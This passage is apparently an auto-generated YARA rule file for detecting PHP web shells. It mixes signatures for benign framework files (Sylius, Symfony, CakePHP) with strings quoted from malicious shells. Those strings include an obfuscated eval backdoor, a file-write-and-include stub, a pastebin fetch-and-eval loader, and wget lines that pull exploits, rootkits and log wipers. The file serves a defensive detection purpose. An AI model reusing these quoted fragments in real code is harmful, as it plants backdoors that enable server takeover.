      $s11 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s12 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s13 = "'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd'," fullword ascii
      $s14 = "'eng_text101'=>'Use reverse (user -> resu) login for password'," fullword ascii
      $s15 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s16 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s17 = "asename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s18 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s19 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s20 = "$b = \"q1w2e3r4\"; //need hits \"shell created by evilc0ders\"" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule PreconditionFailedTest
{
   meta:
      description = "php22 - file PreconditionFailedTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8180b2671c54de4d3e11b1b6e15b449d8227c47177c65279a51492196cb66cf5"
   strings:
      $s1 = "$this->assertEquals('Precondition Failed', $exception->getMessage());" fullword ascii
      $s2 = "$this->assertEquals(412, $exception->getStatusCode());" fullword ascii
      $s3 = "$this->assertEquals([1,2,3], $exception->getDetails());" fullword ascii
      $s4 = "$this->assertEquals(9, $exception->getCode());" fullword ascii
      $s5 = "class PreconditionFailedTest extends \\PHPUnit_Framework_TestCase" fullword ascii
      $s6 = "$exception = new PreconditionFailed(9, [1,2,3]);" fullword ascii
      $s7 = "<?php namespace Phprest\\Exception;" fullword ascii
      $s8 = "public function testInstantiation()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule overview
{
   meta:
      description = "php22 - file overview.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fced402e457415600d620058b5aabff2c69b63ca053a990023b8ca9e75937626"
   strings:
      $s1 = "<?= \\humhub\\widgets\\LoaderWidget::widget(); ?>" fullword ascii
      $s2 = "'sendDesktopNotifications' => boolval(Yii::$app->notification->getDesktopNoficationSettings(Yii::$app->user->getIdentity()))," fullword ascii
      $s3 = "'sendDesktopNotifications' => boolval(Yii::$app->notification->getDesktopNoficationSettings(Yii::$app->user->getIdentity()))" fullword ascii
      $s4 = "'placeholder' => Yii::t('NotificationModule.widgets_views_list', 'There are no notifications yet.')" fullword ascii
      $s5 = "<div class=\"arrow\"></div><?= Yii::t('NotificationModule.widgets_views_list', 'Notifications'); ?>" fullword ascii
      $s6 = "<!-- container for ajax response -->" fullword ascii
      $s7 = "<?= Yii::t('NotificationModule.widgets_views_list', 'Show all notifications'); ?>" fullword ascii
      $s8 = "'icon' => $this->theme->getBaseUrl().'/ico/notification-o.png'," fullword ascii
      $s9 = "<?= Yii::t('NotificationModule.widgets_views_list', 'Mark all as seen'); ?>" fullword ascii
      $s10 = "<span id=\"badge-notifications\" style=\"display:none;\" class=\"label label-danger label-notifications\"></span>" fullword ascii
      $s11 = "<a id=\"mark-seen-link\" data-action-click='markAsSeen' data-action-url=\"<?= Url::to(['/notification/list/mark-as-" fullword ascii
      $s12 = "<li id=\"loader_notifications\">" fullword ascii
      $s13 = "', 'Open the notification dropdown menu')?>\" data-toggle=\"dropdown\" >" fullword ascii
      $s14 = "<div class=\"dropdown-header-link\">" fullword ascii
      $s15 = "<a class=\"btn btn-default col-md-12\" href=\"<?= Url::to(['/notification/overview']); ?>\">" fullword ascii
      $s16 = "<li class=\"dropdown-header\">" fullword ascii
      $s17 = "<ul id=\"dropdown-notifications\" class=\"dropdown-menu\">" fullword ascii
      $s18 = "$this->registerJsConfig('notification', [" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule QueryableInterface
{
   meta:
      description = "php22 - file QueryableInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "00710484b8d3a75da596dc68c8fab8a01f6eea1e3458a7d99863ed0f7417a914"
   strings:
      $s1 = "function getSearchResultFromQuery(Query $query);" fullword ascii
      $s2 = "* @return Result" fullword ascii
      $s3 = "* @param Query $query" fullword ascii
      $s4 = "use Concrete\\Core\\Search\\Result\\Result as SearchResult;" fullword ascii
      $s5 = "use Concrete\\Core\\Search\\Result\\Result;" fullword ascii
      $s6 = "use Concrete\\Core\\Entity\\Search\\Query;" fullword ascii
      $s7 = "namespace Concrete\\Core\\Search;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Recipient
{
   meta:
      description = "php22 - file Recipient.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1b213c92e58bbd2125bad3115eca43bebb9d6e2201ba7c8a1649375e72aad437"
   strings:
      $s1 = "* \"Real Name <email@address.com>\" or \"email@address.com\"" fullword ascii
      $s2 = "* Returns true if the provided email address appears to be valid." fullword ascii
      $s3 = "* This does not determine if the address is actually legit, only" fullword ascii
      $s4 = "* @param string email address to validate" fullword ascii
      $s5 = "* Parses an address in the either format:" fullword ascii
      $s6 = "* @return bool 1 (true) if $email is valid, 0 (false) if not" fullword ascii
      $s7 = "* Returns true if $this->Email appears to be a valid email" fullword ascii
      $s8 = "* @copyright  1997-2007 VerySimple, Inc." fullword ascii
      $s9 = "* Object representation of an Email recipient" fullword ascii
      $s10 = "return preg_match(\"/^[_a-z0-9-]+(\\.[_a-z0-9-]+)*@[a-z0-9-]+(\\.[a-z0-9-]+)*(\\.[a-z]{2,25})$/i\", $email);" fullword ascii
      $s11 = "* @param string $val to parse" fullword ascii
      $s12 = "* if it is formatted properly" fullword ascii
      $s13 = "* @author     VerySimple Inc." fullword ascii
      $s14 = "* @version    1.1" fullword ascii
      $s15 = "if ($this->RealName == \"\") $this->RealName = $this->Email;" fullword ascii
      $s16 = "$this->Email = trim( str_replace(\">\",\"\",$pair[1]) );" fullword ascii
      $s17 = "return Recipient::IsEmailInValidFormat($this->Email);" fullword ascii
      $s18 = "* @package    verysimple::Email" fullword ascii
      $s19 = "* @license    LGPL" fullword ascii
      $s20 = "function __construct($email, $name=\"\")" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule PodsRESTFields
{
   meta:
      description = "php22 - file PodsRESTFields.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "20b7c5a0fdfa566cc8c4b02914b2c6dcd843058a734ee9e590b792a8d0bab267"
   strings:
      $s1 = "* Creates an object that adds read/write handlers for Pods fields in default responses." fullword ascii
      $s2 = "* Check if a field supports read or write via the REST API." fullword ascii
      $s3 = "* Add fields, based on options to REST read/write requests" fullword ascii
      $s4 = "* @return bool If supports, true, else false." fullword ascii
      $s5 = "* @param string|Pods $pod Pods object or name of Pods object" fullword ascii
      $s6 = "* Register fields and their callbacks for read/write via REST" fullword ascii
      $s7 = "* @param string|object|Pods $pod Pods object" fullword ascii
      $s8 = "* @param string $field_name The field name." fullword ascii
      $s9 = "public static function field_allowed_to_extend( $field_name, $pod, $mode = 'read' ) {" fullword ascii
      $s10 = "* @param string $field_name Name of field" fullword ascii
      $s11 = "* @param bool   $read       Field allows REST API read access" fullword ascii
      $s12 = "* @param string $mode       Are we checking read or write?" fullword ascii
      $s13 = "$read  = self::field_allowed_to_extend( $field_name, $this->pod, 'read' );" fullword ascii
      $s14 = "$rest_read  = (int) $pod->fields( $field_name, 'rest_read' );" fullword ascii
      $s15 = "protected function register( $field_name, $read, $write ) {" fullword ascii
      $s16 = "add_action( $rest_hook_name, array( 'PodsRESTHandlers', 'save_handler' ), 10, 3 );" fullword ascii
      $s17 = "$read_all  = (int) pods_v( 'read_all', $pod_options, 0 );" fullword ascii
      $s18 = "} elseif ( 'comment' === $this->pod->pod_data['type'] ) {" fullword ascii
      $s19 = "* @param bool   $write      Field allows REST API write access" fullword ascii
      $s20 = "if ( ! has_action( $rest_hook_name, array( 'PodsRESTHandlers', 'save_handler' ) ) ) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}



rule php22_r577
{
   meta:
      description = "php22 - file r577.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
   strings:
      $x1 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $x2 = "$_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s3 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????" fullword ascii
      $s4 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s5 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s6 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s7 = "ASES;\\nSELECT * FROM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\";" fullword ascii
      $s8 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s9 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s10 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s11 = "exit(\"<b><a href=http://www.spygrup.org>www.spygrup.org</a> : Access Denied</b>\");" fullword ascii
      $s12 = "/*                    admin@spygrup.org[Kruis]   -   yaduris@spygrup.org[YaduriS]" fullword ascii
      $s13 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s14 = "echo sr(45,\"<b>\".$lang[$language.'_text84'].$arrow.\"</b>\".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),\"\");" fullword ascii
      $s15 = "/* else { if(($rows = @mssql_affected_rows($db)) > 0) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>affecte" fullword ascii
      $s16 = "if($error) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>\".$error.\"</b></font></td></tr></table>" fullword ascii
      $s17 = "if(($error = @ocierror())) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>\".$error['message'].\"</b>" fullword ascii
      $s18 = "$res = @mysql_query(\"SELECT * FROM `\".$_POST['mysql_tbl'].\"`\", $db);" fullword ascii
      $s19 = "$keys = @implode(\"&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;\", @array_keys($row));" fullword ascii
      $s20 = "echo sr(45,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_n" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule persister_two_behavior
{
   meta:
      description = "php22 - file persister_two_behavior.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4d76836ea9dc0dd3dc4a7e1ab8e55605d73d72dd3539b9bfa0efa71a684ccfd5"
   strings:
      $s1 = "* Behavior to simplify manipulating a model's bindings when doing a find operation" fullword ascii
      $s2 = "* Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s3 = "* CakePHP(tm) : Rapid Development Framework (http://cakephp.org)" fullword ascii
      $s4 = "* @license       MIT License (http://www.opensource.org/licenses/mit-license.php)" fullword ascii
      $s5 = "* @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s6 = "* Behavior to allow for dynamic and atomic manipulation of a Model's associations used for a find call. Most useful for limitin" fullword ascii
      $s7 = "* Redistributions of files must retain the above copyright notice." fullword ascii
      $s8 = "* Behavior for binding management." fullword ascii
      $s9 = "* the amount of associations and data returned." fullword ascii
      $s10 = "* Licensed under The MIT License" fullword ascii
      $s11 = "* @link          http://cakephp.org CakePHP(tm) Project" fullword ascii
      $s12 = "* @subpackage    cake.tests.test_app.models" fullword ascii
      $s13 = "* @since         CakePHP(tm) v 1.2.0.5669" fullword ascii
      $s14 = "* Behavior to allow for dynamic and atomic manipulation of a Model's associations used for a find call. Most useful for limiting" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule ProxyTestObject
{
   meta:
      description = "php22 - file ProxyTestObject.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0ae1fd1243f4f1ec54faafa16b9352ba53287b4512b8f6104801f51a6ef53e6b"
   strings:
      $s1 = "namespace SilverStripe\\Core\\Tests\\Injector\\AopProxyServiceTest;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_qiang5
{
   meta:
      description = "php22 - file qiang5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "689a42fb0ab04197655c526346d41d0bf014931798ae61eeba2ec8040e3bf42a"
   strings:
      $s1 = "($b4dboy = $_POST['b4dboy']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_Ok
{
   meta:
      description = "php22 - file Ok.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8b290aaff41972bbb87e7d65b8c229f12fa21bd8b9fc7b7cd3e1f145f2d61eb5"
   strings:
      $s1 = "parent::__construct($content, Response::HTTP_OK, $headers);" fullword ascii
      $s2 = "* @param mixed $content The response content, see setContent()" fullword ascii
      $s3 = "* @throws \\InvalidArgumentException When the HTTP status code is not valid" fullword ascii
      $s4 = "* @param array $headers An array of response headers" fullword ascii
      $s5 = "public function __construct($content = '', $headers = [])" fullword ascii
      $s6 = "use Phprest\\HttpFoundation\\Response;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule php_shell_file_put_contents
{
   meta:
      description = "php22 - file php-shell-file_put_contents.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "64b45c6b977d7762e25ba6648d8795d00226aa66cf9a723ee6a4a4fee9cc2955"
   strings:
      $s1 = "$file = file_put_contents('code.php','<?php '.$_REQUEST['code'].' ?>');" fullword ascii
      $s2 = "include 'code.php';" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule Requirements_Minifier
{
   meta:
      description = "php22 - file Requirements_Minifier.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6cbea22e0102b5e887f81088a88d135d47a5687c81bbc934dbaa627d6a2cda9f"
   strings:
      $s1 = "* Provides an abstract interface for minifying content" fullword ascii
      $s2 = "* @return string minified content" fullword ascii
      $s3 = "* Minify the given content" fullword ascii
      $s4 = "* @param string $filename Name of file to display in case of error" fullword ascii
      $s5 = "* @param string $type Either js or css" fullword ascii
      $s6 = "public function minify($content, $type, $filename);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PlaylistId
{
   meta:
      description = "php22 - file PlaylistId.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6b099f8895c41a7459ee45a0a16c1390fcea9bc6a99347b8cfab89d8ab042e28"
   strings:
      $s1 = "* @version    $Id: PlaylistId.php 20096 2010-01-06 02:05:09Z bkarwin $" fullword ascii
      $s2 = "* Represents the yt:playlistId element" fullword ascii
      $s3 = "* @see Zend_Gdata_Extension" fullword ascii
      $s4 = "* @subpackage YouTube" fullword ascii
      $s5 = "// require_once 'Zend/Gdata/Extension.php';" fullword ascii
      $s6 = "$this->registerAllNamespaces(Zend_Gdata_YouTube::$namespaces);" fullword ascii
      $s7 = "protected $_rootElement = 'playlistId';" fullword ascii
      $s8 = "protected $_rootNamespace = 'yt';" fullword ascii
      $s9 = "* @package    Zend_Gdata" fullword ascii
      $s10 = "public function __construct($text = null)" fullword ascii
      $s11 = "class Zend_Gdata_YouTube_Extension_PlaylistId extends Zend_Gdata_Extension" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule PKCS7Encoder
{
   meta:
      description = "php22 - file PKCS7Encoder.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a65d777357a182f8fc68c1c4f295a3d14ab8cef3d9bc2b5d7d5e4702584e71cc"
   strings:
      $s1 = "$amount_to_pad = PKCS7Encoder::$block_size - ($text_length % PKCS7Encoder::$block_size);" fullword ascii
      $s2 = "return substr($text, 0, (strlen($text) - $pad));" fullword ascii
      $s3 = "* @param decrypted " fullword ascii
      $s4 = "* @param $text " fullword ascii
      $s5 = "$pad = ord(substr($text, -1));" fullword ascii
      $s6 = "for ($index = 0; $index < $amount_to_pad; $index++) {" fullword ascii
      $s7 = "* PKCS7Encoder class" fullword ascii
      $s8 = "$block_size  = PKCS7Encoder::$block_size;" fullword ascii
      $s9 = "return $text . $tmp;" fullword ascii
      $s10 = "$tmp .= $pad_chr;" fullword ascii
      $s11 = "$amount_to_pad = PKCS7Encoder::block_size;" fullword ascii
      $s12 = "function decode($text)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}



rule php22_res7
{
   meta:
      description = "php22 - file res7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7460a772e4b8d5da9887fb89bc65f364b4e5197a1b1bc7df199a23ab5e83b3c2"
   strings:
      $x1 = "$hythan= file_get_contents('http://pastebin.com/raw/Qu7ZKGeq');" fullword ascii
      $s2 = "eval(str_rot13(gzinflate(str_rot13(base64_decode(($hythan))))));" fullword ascii
      $s3 = "$auth_pass = \"\"; " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule PreQualifiedPromotionsProviderInterface
{
   meta:
      description = "php22 - file PreQualifiedPromotionsProviderInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "450ee56b0b3764c1909c335be3d41570a773028552b155f5f70d0e436565cd35"
   strings:
      $s1 = "public function getPromotions(PromotionSubjectInterface $subject): array;" fullword ascii
      $s2 = "* @param PromotionSubjectInterface $subject" fullword ascii
      $s3 = "use Sylius\\Component\\Promotion\\Model\\PromotionSubjectInterface;" fullword ascii
      $s4 = "* @return PromotionInterface[]" fullword ascii
      $s5 = "use Sylius\\Component\\Promotion\\Model\\PromotionInterface;" fullword ascii
      $s6 = "namespace Sylius\\Component\\Promotion\\Provider;" fullword ascii
      $s7 = "interface PreQualifiedPromotionsProviderInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ProductVariantChoiceType
{
   meta:
      description = "php22 - file ProductVariantChoiceType.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c0590d61aa13e0420874c77a91e81801ed2f49b414d0c2ec25694f39e190bbfe"
   strings:
      $s1 = "public function configureOptions(OptionsResolver $resolver): void" fullword ascii
      $s2 = "use Symfony\\Component\\Form\\Extension\\Core\\Type\\ChoiceType;" fullword ascii
      $s3 = "return $options['product']->getVariants();" fullword ascii
      $s4 = "$builder->addViewTransformer(new CollectionToArrayTransformer(), true);" fullword ascii
      $s5 = "use Symfony\\Component\\OptionsResolver\\OptionsResolver;" fullword ascii
      $s6 = "use Sylius\\Component\\Product\\Model\\ProductInterface;" fullword ascii
      $s7 = "use Symfony\\Bridge\\Doctrine\\Form\\DataTransformer\\CollectionToArrayTransformer;" fullword ascii
      $s8 = "public function getBlockPrefix(): string" fullword ascii
      $s9 = "public function buildForm(FormBuilderInterface $builder, array $options): void" fullword ascii
      $s10 = "use Symfony\\Component\\OptionsResolver\\Options;" fullword ascii
      $s11 = "use Symfony\\Component\\Form\\FormBuilderInterface;" fullword ascii
      $s12 = "public function getParent(): string" fullword ascii
      $s13 = "use Symfony\\Component\\Form\\AbstractType;" fullword ascii
      $s14 = "namespace Sylius\\Bundle\\ProductBundle\\Form\\Type;" fullword ascii
      $s15 = "'choices' => function (Options $options) {" fullword ascii
      $s16 = "return 'sylius_product_variant_choice';" fullword ascii
      $s17 = "'choice_label' => function ($variant) {" fullword ascii
      $s18 = "'choice_translation_domain' => false," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule ProductAttributeController
{
   meta:
      description = "php22 - file ProductAttributeController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "82629437747d1d67cbd09a62bbafe026cb37a6806c58661b240b3e1476c2f05e"
   strings:
      $s1 = "$template = $request->attributes->get('template', 'SyliusAttributeBundle::attributeValueForms.html.twig');" fullword ascii
      $s2 = "$template = $request->attributes->get('template', 'SyliusAttributeBundle::attributeChoice.html.twig');" fullword ascii
      $s3 = "public function getAttributeTypesAction(Request $request, string $template): Response" fullword ascii
      $s4 = "->createNamed('value', $attributeForm, null, ['label' => $attribute->getName(), 'configuration' => $attribute->g" fullword ascii
      $s5 = "use Symfony\\Component\\HttpKernel\\Exception\\BadRequestHttpException;" fullword ascii
      $s6 = "->setTemplateVar($this->metadata->getPluralName())" fullword ascii
      $s7 = "$attributeForm = $this->get('sylius.form_registry.attribute_type')->get($attribute->getType(), 'default');" fullword ascii
      $s8 = "protected function getAttributeFormsInAllLocales(AttributeInterface $attribute, array $localeCodes): array" fullword ascii
      $s9 = "$forms[$attribute->getCode()] = $this->getAttributeFormsInAllLocales($attribute, $localeCodes);" fullword ascii
      $s10 = "$localeCodes = $this->get('sylius.translation_locale_provider')->getDefinedLocalesCodes();" fullword ascii
      $s11 = "return $this->render($template, ['form' => $form->createView()]);" fullword ascii
      $s12 = "$configuration = $this->requestConfigurationFactory->create($this->metadata, $request);" fullword ascii
      $s13 = "use Symfony\\Component\\HttpFoundation\\Response;" fullword ascii
      $s14 = "'types' => $this->get('sylius.registry.attribute_type')->all()," fullword ascii
      $s15 = "* @param AttributeInterface $attribute" fullword ascii
      $s16 = "$form = $this->get('form.factory')->create(ProductAttributeChoiceType::class, null, [" fullword ascii
      $s17 = "* @param Request $request" fullword ascii
      $s18 = "return $this->render($template, [" fullword ascii
      $s19 = "* @return array|FormView[]" fullword ascii
      $s20 = "* @param array|string[] $localeCodes" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule PdoCacheTest
{
   meta:
      description = "php22 - file PdoCacheTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5cb0084a311a924d3691376835409a175e88fbf875026e2df9de0f49970fc204"
   strings:
      $s1 = "self::$dbFile = tempnam(sys_get_temp_dir(), 'sf_sqlite_cache');" fullword ascii
      $s2 = "* @group time-sensitive" fullword ascii
      $s3 = "use Symfony\\Component\\Cache\\Tests\\Traits\\PdoPruneableTrait;" fullword ascii
      $s4 = "self::markTestSkipped('Extension pdo_sqlite required.');" fullword ascii
      $s5 = "use Symfony\\Component\\Cache\\Simple\\PdoCache;" fullword ascii
      $s6 = "use PdoPruneableTrait;" fullword ascii
      $s7 = "namespace Symfony\\Component\\Cache\\Tests\\Simple;" fullword ascii
      $s8 = "return new PdoCache('sqlite:'.self::$dbFile, 'ns', $defaultLifetime);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule organizer
{
   meta:
      description = "php22 - file organizer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e81ac519e1cfeeffb7ac88a58e9460f5a2b550ae38e6fe18f1d17eab0c1f062"
   strings:
      $s1 = "'process_field' => false," fullword ascii
      $s2 = "'sidebar' => 'template_fields'," fullword ascii
      $s3 = "//add_action('init', 'ninja_forms_register_field_organizer');" fullword ascii
      $s4 = "ninja_forms_register_field('_organizer', $args);" fullword ascii
      $s5 = "function ninja_forms_register_field_organizer(){" fullword ascii
      $s6 = "<?php if ( ! defined( 'ABSPATH' ) ) exit;" fullword ascii
      $s7 = "'name' => __( 'Organizer', 'ninja-forms' )," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PromotionRuleChoiceType
{
   meta:
      description = "php22 - file PromotionRuleChoiceType.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1f1b9cde1817ef1bb88d9cb49bfa08bc99a746249399e550d33d431795958309"
   strings:
      $s1 = "public function configureOptions(OptionsResolver $resolver): void" fullword ascii
      $s2 = "use Symfony\\Component\\Form\\Extension\\Core\\Type\\ChoiceType;" fullword ascii
      $s3 = "use Symfony\\Component\\OptionsResolver\\OptionsResolver;" fullword ascii
      $s4 = "public function getBlockPrefix(): string" fullword ascii
      $s5 = "public function getParent(): string" fullword ascii
      $s6 = "use Symfony\\Component\\Form\\AbstractType;" fullword ascii
      $s7 = "namespace Sylius\\Bundle\\PromotionBundle\\Form\\Type;" fullword ascii
      $s8 = "public function __construct(array $rules)" fullword ascii
      $s9 = "return 'sylius_promotion_rule_choice';" fullword ascii
      $s10 = "'choices' => array_flip($this->rules)," fullword ascii
      $s11 = "private $rules;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _oi_php_decode_p0isoN_sh3ll_r57_biz_Dq99Shell_0
{
   meta:
      description = "php22 - from files oi.php.decode.php, p0isoN.sh3ll.php, r57.biz_Dq99Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9978ea2bdfbadad460a3871b5a357cc25342820808536cb3fb652f2324df2dfb"
      hash2 = "16623a1a16ede2b5c5dea7a7ff0b32516a970915564461842e003133cb3046d3"
      hash3 = "80750b669b03b8ee93e0591222c940cb875a3feadf7f7aedda0e56f68fb6b240"
   strings:
      $x1 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
      $x2 = "elseif ( enabled(\"passthru\") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x3 = "elseif ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x4 = "if ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x5 = "\"<tr><td></td><td><input type=\\\"checkbox\\\" name=\\\"fqb_onlywithsh\\\" value=\\\"1\\\"> Users only with shell</td></tr>\"." fullword ascii
      $x6 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
      $x7 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesiz" fullword ascii
      $x8 = "array(\"Downloaders?\",\"which wget curl w3m lynx fetch lwp-download\")," fullword ascii
      $x9 = "array(\"wget & run BindDoor\",\"wget \".$sh_mainurl.\"bind.tgz;tar -zxvf bind.tgz;./4877\")," fullword ascii
      $x10 = "array(\"wget WIPELOGS PT1\",\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\")," fullword ascii
      $s11 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> <input type=submit name=submit value=\"Execute\">" fullword ascii
      $s12 = "<title>'.getenv(\"HTTP_HOST\").' - '.sh_name().'</title>" fullword ascii
      $s13 = "array(\"Cpanel Config\",\"/var/cpanel/accounting.log\")," fullword ascii
      $s14 = "echo \"MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($sql_server)." ascii
      $s15 = "else {echo \"<a href=\\\"\".$surl.\"act=security&nixpasswd=1&d=\".$ud.\"\\\"><b>Download /etc/passwd</b></a>\";}" fullword ascii
      $s16 = "\"<tr><td>Target Directory:</td><td><input name=\\\"uploadpath\\\" size=\\\"70\\\" value=\\\"\".$dispd.\"\\\"></td></tr>\"." fullword ascii
      $s17 = "$fqb_log = \"FTP Quick Brute (\".$sh_name.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s18 = "echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login " ascii
      $s19 = "elseif ($sql_act == \"tbldump\") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl)" fullword ascii
      $s20 = "else {echo \"<b>PHP-code Execution (Use without PHP Braces!)</b>\"; if (empty($eval_txt)) {$eval_txt = TRUE;}}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _php_php1_1
{
   meta:
      description = "php22 - from files php.php, php1.php"
      author = "WatcherLab"
